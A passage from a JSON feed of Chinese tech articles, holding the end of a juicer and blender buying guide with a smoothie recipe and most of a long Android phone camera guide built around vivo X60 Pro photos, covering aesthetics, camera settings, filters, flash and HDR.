≥ 料理机 &gt; 果汁杯 ≥ 料理棒。</strong></p>\n<h3>价格</h3>\n<p>在价格上，常见品牌的原汁机、破壁机、料理棒、料理机的价格能够相差好几倍，便携果汁杯通常都可以在比较便宜的价位买到。千元的预算，大部分都能买到，百元以内，就只剩基础款的果汁杯或者料理机了。这个需要根据自己的预算和需要进行对比。</p>\n<h3>其他功能需要</h3>\n<p>这个主要是为了看除了制作蔬果汁外，对机器还有什么额外的需求。</p>\n<p>果汁杯和原汁机基本上就是榨汁的需求了。</p>\n<p>有的料理机或者破壁机是有加热功能的，煮粥、豆浆都能完成，很多料理机会配好几个刀头，当作研磨机、绞肉机。料理棒没有加热功能，但是也可以根据需要选择刀头，绞肉或者婴儿辅食，有的还可以做冰沙。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/b502fa1520834eab7218ce542cf96e73.png\"></figure><p>我家之前是一款小熊的果汁杯，能满足当时偶尔使用的需求，我也会用它把泡好的黄豆打碎，然后自行用滤网过滤，再用锅煮豆浆，比较原始的方法。但最近两年做饭的频率和难度都有所提升，所以家里迭代了之前的果汁杯，换成了可以无极换挡的搅拌棒。大部分时间是用来做蔬果汁，还会用来做红豆沙、鹰嘴豆泥、豆浆、果酱和各类肉丸。我爸妈家用的是破壁机和原汁机，常用的还是破壁机，他们用来打豆浆和杂粮粥，原汁机因为清洗麻烦，有点闲置。</p>\n<p>综合上面的几个方面以及我自己的使用体验，<strong>我更推荐大家从破壁机、料理机、料理棒和果汁杯里做选择</strong>。</p>\n<h2>🧙‍♀️彩蛋</h2>\n<p>嘿嘿，该来的还是来了。附赠一个魔法料理🪄！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/007880c67ecdc4ea20135fae6d7f0691.png\"></figure><p>用料：羽衣甘蓝 60g，香蕉四分之一根，蓝莓干适量，可可粉一丢丢，椰子水 150ml。</p>\n<p>这一杯的关键在于可可粉，可可粉可以加多可以加少，非要做黑暗料理的话，可以加一整勺，不想成为黑暗料理届的代表人物的话，可以考虑稍稍加一小撮，5g 以内，不要更多了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/5f5e6e509024dce848b4757896ab08f7.png\"></figure><p>可可粉我为了拍图的时候更明显，刻意多倒了一些在小碗里，结果打蔬果汁的时候，忘了这件事，一口气都放进去了😭。加多了的后果是除了香蕉的味道无法被它掩盖之外，其他的口味完全被埋没了。既然无法亲口品尝魔法的力量，就快来用眼睛感受这神秘又矜持的魔力吧(๑•̀ㅂ•́)و✧。</p>\n","link":"https://sspai.com/post/67831"},{"title":"安卓相机完全操作指南","date":"2021-07-20 14:15:08","description":"\n<h2>写在前面</h2>\n<p>现在是北京时间的 2021 年 6 月 18 日晚上 11 点 24 分，我正坐在新疆夏塔的温泉酒店里。今天的拍摄很不顺利，天空阴气沉沉，而且时不时落着小雨。而我刚刚得到消息，明早的日出拍摄也落空了，因为几乎不会有日出的可能。</p>\n<p>所以，现在我突然有了一块很完整的时间，我想这是一个很好的机会，让我整理一下心情，开始这一篇长篇文章的写作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9d8a1918cb0bfa6ab48ca1fa05b7ae75_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic2.zhimg.com/v2-9d8a1918cb0bfa6ab48ca1fa05b7ae75_r.jpg\"></figure><p>如你所见，这篇文章的名字叫做《安卓相机操作指南》。这也就意味着还有一篇《iPhone 相机操作指南》，而我相信其实很多人之所以能够了解我就是因为那篇文章。最近的《iPhone 相机操作指南 3.0》目前在各个社交网络平台总的阅读量已经超过了 1000 万。一想到每 140 个人中，就有一个人阅读过我的文章，心里还是有一点骄傲。</p>\n<p>但正是这篇文章的火爆，越来越多的读者通过各种方式询问，什么时候可以有一个《安卓相机操作指南》。一开始我都会用「本质上都是相通，安卓用户阅读一样有收获」来回答，但其实归根到底是因为「心虚」。因为在当时，我并没有长时间大批量使用安卓手机的经历，我很清楚，我还没有能力完成这样的写作。并且当时 iPhone 相机在手机摄影领域也是一枝独秀，我也认为安卓手机还「不值得认真」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-928a94c8888951eecbb33f0d5c04dc8e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-928a94c8888951eecbb33f0d5c04dc8e_r.jpg\"></figure><p>但是时间过得很快，这两年里我自己发生了很多变化，由于工作的原因，我开始接触大量的安卓旗舰影像手机，甚至是在过去的两年里，为不同的安卓机型进行过深度测试，或者是完成样片拍摄。而与此同时，这两年里国产安卓的影像能力突飞猛进，甚至还演绎出了自己的不同特色。</p>\n<p>所以，我想现在是一个很好的时机，完成这一篇《安卓相机操作指南》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9b5f2e2071d669d5cd36e96142db27fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic3.zhimg.com/v2-9b5f2e2071d669d5cd36e96142db27fe_r.jpg\"></figure><p>但是想要完这样一篇文章，不仅仅是对我有难度，我相信对于在座的各位也有难度，因为不出意外，这篇文章的字数将会达到 30000 字以上，堪比一篇论文。不过事实已经证明，只要你拿出诚意写作，就会获得诚意的回响。我在写《iPhone相机操作指南 1.0》的时候某个平台的完整阅读率不足 5%，但是等到《iPhone 相机操作指南 3.0》，文章的完整阅读率竟然达到了 20%。</p>\n<p>说到这里，是想告诉你不要因为这篇文章看起来很长就下意识放弃，相信我，我会尽量用最直白、简单、有趣而又真诚的文字帮你做好手机摄影这件事。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-44d802a24b0c5a897c46bcd8b8b967f8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-44d802a24b0c5a897c46bcd8b8b967f8_r.jpg\"></figure><p>另一件我想要和你分享的学习心得是，「请尝试先一口气读完。」</p>\n<p>我一直很反对「摄影教程的碎片化」。其实不仅仅是摄影教程，我认为任何一门技艺的学习都离不开「系统」。我在《iPhone 相机操作指南》中不断重申的一点：</p>\n<p><b>今天很多人看似在学习知识，其实很多时候不过是获取信息。</b></p>\n<p>今天的社交网络好像到处都是摄影教程，但是所有的这些教程都是零零散散，而这些不系统的知识，唯一的帮助就是满足你的获得感。对你的实际帮助不仅微乎其微，甚至是会产生一定程度的误导，就是典型的「知其然不知其所以然」。因此我一直建议，如果你真的想要学会拍好照片，找到一本好书，系统地学习，绝对才是真正的收获颇丰。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-293b296066f5878181d7622c61f517f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-293b296066f5878181d7622c61f517f3_r.jpg\"></figure><p>这听起来我好像在自吹自擂（其实也有点），但的确这篇文章和其它教程最大的不同就是在于「它非常系统」。我甚至是完全按照一本书的骨架进行丰满（事实上，《iPhone 相机操作指南》的实体书真的很快就上市了）。</p>\n<p>不信你看，你现在看的前言就是一本书的标准构成。</p>\n<p>我知道，我知道。</p>\n<p>今天的各位对于阅读文字肯定是希望越短越好，所以这篇文章的文字我将会尽最大可能的凝练。换句话说，如果你真的想学好手机拍照，或者是大一点说想要学好摄影，那这不仅仅是我目前所学，也是你必须要了解的最少基本。</p>\n<p>既然是安卓手机摄影指南，所以我还想和大家分享一些我对于安卓手机摄影的理解。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f6ccc56bcf3317c2d70156c356e3d8ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-f6ccc56bcf3317c2d70156c356e3d8ad_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>很多人说，今天的手机功能似乎到了一个瓶颈，因为今天几乎所有的品牌在发布会上笔墨最多的就是拍照能力。相信通过前面问题的一个探讨，你应该已经意识到，并不是手机厂商选择「影像能力」，而是我们今天的生活已经完完全全：</p>\n<p>「离不开影像。」</p>\n<p>我很喜欢《旅行的意义》中的一句话：</p>\n<blockquote>人生的许多光景，好像只有被影像记录下来，才会减少时间飞逝的焦虑。</blockquote>\n<p>所以某种意义上，手机的影像能力并不是手机的附属，而是手机的重要组成部分，我甚至更愿意叫它「手持的相机」。</p>\n<p>而这个手持的相机也有着自己独特的发展轨迹，这种轨迹在今天也演绎出了两个非常重要的派别，也就是「iPhone 手机摄影」和「安卓手机摄影」。iPhone 手机摄影的风格我在《iPhone 相机操作指南》中已经详尽表述，在这里我就不再赘述。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b0797bed5fdacf0fbfa1a3ebc0699ace_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-b0797bed5fdacf0fbfa1a3ebc0699ace_r.jpg\"></figure><p>所以我们就来说说安卓手机摄影风格。</p>\n<p>可困难的是，我们知道安卓手机的品牌和型号众多。其实长久以来，这也是安卓手机摄影的问题所在。因为摄影需要长时间的沉淀，但是安卓品牌因为差异竞争的追求，导致几乎每个品牌都是各说各话，缺少传承。不过正如前面所说，这几年以来，国产安卓旗舰产品力越发凸显，他们也在尝试弥补个中不足。</p>\n<p>这也让我遇到了写作过程中的第一个大困难（当然也是某种意义上的幸福烦恼）：</p>\n<p>「我到底该选择哪一台手机作为基准。」</p>\n<p>目前国产手机是群雄割据，每一款手机都尝试在影像上有所突破。而且几乎每一款手机我们都或多或少的使用过一段时间，拿出任何一款倒是都能说个一二。这其实也是我迟迟未能下笔的另一个原因。</p>\n<p>不过在纠结了一段时间以后，我决定反向思考。我不再从某个手机品牌的角度出发，而是从自己现有的拍摄作品出发，统计出自己使用频率最高的一款。</p>\n<p>此时我发现，在过去的几年里，我拍摄作品最高的机型竟然完全出自一个系列，而且这个结果同时也印证在了我的好朋友摄影师 Jamie 身上（Jamie 也是本文大量样张的作者）。</p>\n<p>这就是，vivo  X50 &amp; vivo X60 系列。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-dee83977b96146d108bc2a2212870b32_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-dee83977b96146d108bc2a2212870b32_r.jpg\"></figure><p>我们共计使用二者拍摄超过了近万张照片，远超出其它安卓影像旗舰。所以选择哪一款机型的问题，便迎刃而解。一方面大量的拍摄样片是整个教程丰富度的基础，而另一方面这也说明了 vivo X 系列的「全面」。这种全面首先是硬件上多个焦距综合实力最佳，并有独特影像技术加持。然后由技术传导到拍摄题材，无论你是风光还是人像，日常记录还是作品创作，拍远拍近，拍大拍小都完全胜任。</p>\n<p>此时我们再回看，vivo 的顶级安卓影像旗舰的确可圈可点，尤其是 vivo X50 Pro 到今天的 vivo X60 Pro 系列，可以绝对代表国产影像实力，所以我也从心底里愿意为这样的优秀产品打 call ，就像是我当时对 iPhone 拍照的热爱一样。</p>\n<p><b>所以，本文所有图片均使用 vivo X50 Pro 以及 vivo X60 Pro 拍摄。</b></p>\n<p>言归正传，vivo X60 Pro 系列为代表的国产安卓影像旗舰的特点为：</p>\n<p><b>1. 高规格的硬件基础</b></p>\n<p>这里更高规格的硬件基础，请不要简单地误解为高像素。我这里真的需要重申一次，高像素对于摄影，尤其是手机摄影并不是重要因素，甚至不能说是主要因素。像素影响的无非就是分辨率，但是今天手机的相机像素已经远超用户的实际使用能力。</p>\n<p>所以这里所说的高规格更多的指传感器尺寸面积的增加，以及镜头物理组的技术突破。前者让今天的手机有了更好的弱光画质，而后者让长焦镜头在手机上终于大放异彩。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8bd1850770396180122ca78eacf3e036_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-8bd1850770396180122ca78eacf3e036_r.jpg\"></figure><p><b>2. 具有明确风格的颜色调教</b></p>\n<p>以前一提到安卓手机可能会说颜色太艳丽，但是实际上这几年主流安卓手机的调色风格不仅越发克制，甚至是还开始演绎出自己的风格。</p>\n<p>比如 vivo 的高端影像机的调色风格就非常的油画且浓郁。我甚至在社交网络上把 vivo 的照片和徕卡相机的直出图片进行对比，竟然大多数人无法分清二者的区别。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d5a8a25f92280d4e4c4bc056352e51f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-d5a8a25f92280d4e4c4bc056352e51f3_r.jpg\"></figure><p><b>3. 更加多样化的内置相机</b></p>\n<p>由于安卓本身应用生态的原因，导致缺少很多 iPhone 上流行的好玩应用。但是好在，安卓手机在内置相机的功能设置上更为大胆。比如自定义专业拍照模式已经存在多年，现在这个专业模式甚至延伸到了视频领域。另一方面包括一些个性化功能，比如虚化焦外调整，也直接内置。某种意义上，也提高了拍摄效率。</p>\n<p>而以上三点，也是这篇文章围绕的核心，在我看来，它也是我使用安卓手机摄影的几个最重要的乐趣。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c65fdde73a63a9987bc0353856872912_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-c65fdde73a63a9987bc0353856872912_r.jpg\"></figure><p>好了，废话就到这里了（虽然我认为这些废话很有用），让我们正式开始这场手机摄影之旅吧。</p>\n<p>当然按照我的写作习惯，我在前面放上一张全文的思维导图，它是我们这趟旅行的重要指南针，希望你可以先从全局上对于拍照这件事有一个把握。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-01c25af8b02ce78032184ac6be618cec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2506\" data-rawheight=\"2648\" class=\"origin_image zh-lightbox-thumb\" width=\"2506\" data-original=\"https://pic1.zhimg.com/v2-01c25af8b02ce78032184ac6be618cec_r.jpg\"></figure><h2>01. 避不开的审美</h2>\n<p>在所谓的干货之前，我可能需要告诉你一个残酷的事实。即最终决定你照片好坏的可能并不是技术，而是审美。从我的亲身经历来看，如果一个人有着非常好的审美，或者有非常系统的美学教育，那么拍照水平一定不会差。</p>\n<p>甚至是，我身边的很多知名摄影师，他们对于相机原理一知半解，但是因为有过长时间的音乐、美术、舞蹈的学习，都能拍摄出非常惊叹的照片。其实我自己是非常羡慕的。因为我自己来自于教育相对落后的区域。最大的痛点就是美术课和音乐课基本上都是摆设。最直接的影响是，我已经大学毕业了，却对于色彩知识完全不知。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3ae16b1167ad0e74b83080dac81b9238_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-3ae16b1167ad0e74b83080dac81b9238_r.jpg\"></figure><p>但今天我早就发现，所谓的后期调色，就是摄影师本身对于颜色的理解。而一些更高级的摄影后期，本质上都是在照片的基础上「进行绘画」。</p>\n<p>不过，好在审美并不仅仅局限于艺术领域。归根到底，艺术就是一种「表达」。而只要你有着足够丰沛的表达能力，照片只不过是一种表达的媒介而已。安塞尔·亚当斯说：</p>\n<blockquote>我们不是在用相机在拍照，我们带到摄影中去的是你曾经读过的书，看过的电影，听过的音乐，走过的路，爱过的人。</blockquote>\n<p>归根到底，你的经历也是你的审美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f5c1546b0beafb49143b01a4ec8e5785_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-f5c1546b0beafb49143b01a4ec8e5785_r.jpg\"></figure><p>所以即使你和我一样，没有经历过美学教育，也没有关系，我们可以把我们的经历揉入到摄影中。而提升审美能力从现在开始也不晚，其实完全可以通过大量的练习获得。最为直接的就是「大量阅片」。当你看过一百位摄影师的作品时，你自然就会知道到底什么是美。</p>\n<p>这种阅片有很多种，你可以通过社交网络关注摄影师。但我更期待的是你可以去看画册，尤其是各种摄影大师的画册。本文中会多次提到亚当斯的名字，而如果你找到亚当斯的画册，看上几本，你将会重新认识风光摄影，就是这么有效。如果你运气很好，生活在大城市，观展也是最好的方式。并且不仅仅是摄影艺术展，任何有趣的展览都会对你的摄影大有裨益。</p>\n<p>你可能注意到了，本文中的配图数量惊人，基本上每几百字就会有一张配图。这是因为我们希望这篇文章不仅能在技术上对你有所帮助，而是在审美上也希望给予一些指引。所以每一张照片都是我们花心思精心挑选。除了读文字，多花点时间仔细看看每一张图，完成这一百张的阅片，也应该有着很不一样的收获。</p>\n<p>这是我能在审美上，唯一能帮助大家的地方。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6ef741b7636e871995a5342e213f5ad2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-6ef741b7636e871995a5342e213f5ad2_r.jpg\"></figure><p>审美这个章节，是本文中所有的章节中最短的一个，但它可能是最重要的一个。我并不是说，技术不重要。但我很欣赏李涛老师的一句话：</p>\n<blockquote>技术决定下限，审美决定上限。</blockquote>\n<p>接下来文中所述技术，我相信读了几遍，自然会懂。而此段所描述审美，可能就要一生践行了，与君共勉。</p>\n<h2>02. 相机基本设置</h2>\n<p>手机相机的拍摄界面我相信很多人几乎天天都会看到，但其中大多数功能可能即使最后手机已经不能再使用，你也从来没有使用甚至是了解过。可正如前面所说，安卓手机一个非常重要的特点就在于内置相机本身极高的功能丰富度。所以其实相机本身有许多功能都是非常重要的创作工具，但却可能被你完全忽视了。</p>\n<p>所以在这一章节中，我们要做的就是了解相机中各项功能的含义，并对它们进行基本设置的选择。需要再次强调的是，在这一部分我将会使用 vivo X60 Pro+ 这款手机的界面进行演示。如果你不是这个型号的安卓手机也不需要担心，绝大多数功能对于其它手机一样具有参考作用。最多的不同之可能是排列的顺序不同而已。所以你大可放心阅读，然后针对性的在自己的手机上尝试。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-573a232ceacfb151e6d2a8d423fa7429_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-573a232ceacfb151e6d2a8d423fa7429_r.jpg\"></figure><p>当我们打开 vivo X60 Pro+ 的相机界面以后，我们其实可以把整个相机的拍摄区域从屏幕下方到上方分为几个部分。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-04abfcb5f87603e042c026ee35b62b05_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1217\" data-rawheight=\"1091\" class=\"origin_image zh-lightbox-thumb\" width=\"1217\" data-original=\"https://pic2.zhimg.com/v2-04abfcb5f87603e042c026ee35b62b05_r.jpg\"></figure><h3>拍摄模式区</h3>\n<p>在这一部分我们可以针对性地选择不同拍摄形式，比如最常见的就是「照片」，其次是「录像」，也就是视频功能。</p>\n<p>而拍摄模式也是我们每一次拍摄最先做的一个决定。当你看到一个场景时，我们潜意识最先要进行的一个判断就是我是想要拍一张照片还是拍一段视频。</p>\n<p>当然也可以是更为细致的类型，比如我是想要拍摄大光圈的人像效果选择人像模式，还是要拍摄弱光下的夜景效果选择夜景模式。总之，这都是我们在打开相机之前就要做好的选择。</p>\n<p>并且选择一个拍摄模式以后，相机界面的各项设置都会针对性跟随更改。考虑到各拍摄模式需要整体知识学习后才能讲解，所以下面其它区域的讲解部分只先从「拍照」模式开始。</p>\n<h3>镜头选择区</h3>\n<p>随着手机摄影的发展，多镜头几乎已经成为每一个主打摄影手机的标配。所以这一个区域就是可以让我们用来选择不同焦距的镜头。可不要小看这一部分，不同镜头有着完全不同的拍摄效果，对于画面有着决定性的作用。所以我们后面甚至会有一个针对性的章节来叙述，这里我们先按下不表，你只要知道这里可以进行不同的镜头切换即可。</p>\n<p>在镜头区域切换一侧的是针对性的效果设置，根据拍摄模式不同也略有差异。不过总得来说，主要包含美颜效果、色彩滤镜、镜头虚化能力等等。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-bc93e6e9bea3699c5b9de13925e0b044_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic1.zhimg.com/v2-bc93e6e9bea3699c5b9de13925e0b044_r.jpg\"></figure><p>所谓的滤镜，代表的是画面中的色彩。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f3fa86a81b69aa097a92c01612919ccd_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-f3fa86a81b69aa097a92c01612919ccd_r.jpg\"><figcaption>使用「肖全滤镜」拍摄</figcaption></figure><p>对于今天的手机用户来说，色彩滤镜可以说是再熟悉不过了。这几乎成为手机最为主流的后期方式。但是现在你也可以把这种后期方式进行前置。先选好自己喜欢的滤镜，再进行拍摄。当然我知道，你可能会说，后期配不是更加自由。但是如果前期可以配滤镜，有两个好处：</p>\n<ol>\n<li>选择择对应的滤镜以后，手机的取景画面也会针对性的改为对应的滤镜颜色，这会极大的提高你的拍摄欲望。你会发现很多平平无奇的场景，可能就是因为滤镜的出现好看起来，让你捕捉到更多意想不到的画面。</li>\n<li>安卓手机的滤镜系统有些不能后期追加。比如在 vivo X60 Pro+ 中，有两个我非常喜欢的滤镜，一个是肖全的黑白滤镜，一个刘雯的彩色滤镜。这两个滤镜都有着非常迷人的影调和色彩风格，但是只有在前期拍摄以后才能选择，不能在现有的照片上添加。我猜测，可能是类似这样的滤镜，为了更好的拍摄效果，镜头的研发工程师们不是在画面上套滤镜，而是在画面中数字转为图像的过程中直接控制色彩风格。这样的好处就是，结果更加真实自然，色彩更加扎实，不虚假。</li>\n</ol>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3bf8a712db6c6a36cdf3ec32b153d204_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-3bf8a712db6c6a36cdf3ec32b153d204_r.jpg\"><figcaption>使用「法式印象」拍摄</figcaption></figure><p>尤其是，大家可以试着打开自己手机里有趣的黑白滤镜，比如 vivo X60 Pro+ 的黑白滤镜进行取景试试，您会发现一个截然不同的黑白世界。</p>\n<p>所谓的光效，是代表画面中的光影之感。</p>\n<p>这一调整主要是针对人像摄影中，人物面部的光影效果。在以前人像中的肖像摄影，摄影师需要使用闪光灯布置拍摄，来营造人物面部的不同光影效果。但是现在手机的算力越来越好，手机开始模拟类似的光影效果。比如 vivo X60 Pro+ 中就包含了不同的拍摄人像光线效果：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-86093375d4d6eb43e83f76665e318e28_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"581\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-86093375d4d6eb43e83f76665e318e28_r.jpg\"></figure><h3>取景框</h3>\n<p>用于画面的实时预览。虽然这里没有任何功能设置，但还是要说一句题外话。安卓手机和 iPhone 一个明显的不同就是取景是否可以所见即所得。iPhone 几乎没有任何差异，过去几年里安卓则差异巨大，尤其是很多手机品牌为了优化，甚至会出现截然不同的结果。</p>\n<p>如果你真的很喜欢手机摄影，那我建议你远离类似的手机。其实这也是我自己很喜欢 vivo X60 Pro+ 的一个原因，它的取景画面和拍摄画面基本上没有太多差异。这对我拍摄构思起到了重要帮助。</p>\n<h3>功能设置区</h3>\n<p>这片区域主要针对每个拍摄模式的针对性设置，它会跟随拍摄模式而变化。</p>\n<p><b>闪光灯</b></p>\n<p>其实我一直认为闪光灯是很多人忽视的「宝藏功能」。</p>\n<p>首先，闪光灯的基本功能是<b>为了画面中光线不足时，主动进行补充。</b></p>\n<p>比如下面画面中的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-78eb3a13806f64ba39b2ec913cfa7202_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-78eb3a13806f64ba39b2ec913cfa7202_r.jpg\"><figcaption>关闭闪光灯拍摄</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0ec4599637b99dc6a7a2f30ecc9551cf_b.jpg\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-0ec4599637b99dc6a7a2f30ecc9551cf_r.jpg\"><figcaption>开启闪光灯拍摄</figcaption></figure><p>但随着后来闪光灯在小型相机上的普及，逐渐演绎出了一种非常独特的摄影风格。尤其是日系写真摄影师们，经常会在人像或者是生活拍摄中使用闪光灯直接拍摄。无论是我们熟知的森山大道还是荒木经惟都有着类似的拍摄使用。</p>\n<p>所以如果你对于自己的拍摄陷入了一种瓶颈，我特别建议你可以试试开启闪光进行拍摄。而且需要注意的是，并不是一定是暗光的夜晚才能使用闪光，也不是只有人像才能使用闪光，而是只要是你想要给自己的作品中增添一种「光感」，都可以进行尝试。</p>\n<p>比如下面的照片：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1b16d9c0a4c570fb483719ba563349a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-1b16d9c0a4c570fb483719ba563349a8_r.jpg\"></figure><p>一个很重要的经验就是，相机中的闪光灯默认的曝光倾向都是为了使面中的主体更亮，所以都会有着一定的过度曝光的倾向。所以为了能够让你的拍摄成功率更好，使用闪光灯时一定要主动的降低画面的曝光。</p>\n<p>直接闪光对于拍摄一些柔和的少女人像可能不太友好。这里也有一个很重要的技巧，就是学会柔光。比如我们可以在闪光灯前罩上一些半透明的介质，甚至是白色的纸巾都可以。这样你会发现补充的光线会自然柔和一些。</p>\n<p>如果说你是一个新手，还是不能很好的驾驭闪光灯，这里的闪光的还有一个很重要的妙用，也就是直接补光。以前在介绍 iPhone 摄影时，这里我需要让大家打开手机的手电筒，这样才能让闪光灯持续点亮，为画面补充光线。弊端是它这需要两台手机的配合，一台补光，一个拍摄。</p>\n<p>但是在 vivo X60 Pro+ 中竟然直接提供了一个补光选项，可以直接常亮，非常贴心。不过如果你的手机没有这个选项，就需要像 iPhone 一样，可以打开手电筒进行补光。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-e45f02efbef994bc2558debf9c5bee4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-e45f02efbef994bc2558debf9c5bee4d_r.jpg\"></figure><p><b>HDR 功能</b></p>\n<p>HDR 功能，基本上是如今智能手机的看家本领。很多人在一些场景中会发现几万块的相机拍摄效果甚至是没有几千块的手机效果好，一个重要的因素就是今天手机的智能 HDR 真的实在是太优秀了。</p>\n<p>比如在下面的场景中，我们看到如果我们不开启 HDR ，画面中天空的场景是过曝的，这是因为室内外光线差别太大，相机的宽容度不够，我们只能照顾亮部或者是暗部的其中一个。</p>\n<p>想要暗部清晰，那么亮部就会过曝。</p>\n<p>想要亮部清晰，那么暗部就会死黑。</p>\n<p>而开启 HDR 以后，正如下图所见：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c1d62442be9d5efe95760c93a9092c4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" 